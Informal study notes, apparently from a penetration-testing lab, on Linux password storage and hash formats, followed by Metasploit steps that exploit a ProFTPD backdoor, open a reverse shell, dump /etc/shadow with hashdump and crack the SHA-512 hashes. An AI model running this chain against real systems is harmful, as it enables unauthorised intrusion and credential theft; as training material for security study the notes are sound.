In the windows we use ntlm or lm in llinux its different

in linux multiple users can access simulteanously that is advantage and disadvantage from security perspective.
all the info of all accounts is stores in /etc/passwd
all the encrypted passwords are stored in /etc/shadow
The shadow file can be accessed only by the root user
|value          |   Hashing Algorithm   |
|$1             |   MD5                 |
|$2             |   Blowfish            |
|$5             |   SHA-256             |
|$6             |   SHA-512             |

here md5 and blowfish are comperatitively easy to crack

in the lab
did nmap on target
found proftpd service there is a exploit too
service postgresql start && msf console
 exploit/unix/ftp/proftpd_133c_backdoor 
set payload payload/cmd/unix/reverse
set rhost,lhost
exploit -z
we have to pass the command 
/bin/bash -i
session is created

use another exploit to dump the passwords using cat/etc/shadow
use post/linux/gather/hashdump
set SESSION 1
exploit 

use auxiliary/analyze/crack_linux
set SHA512 true
run
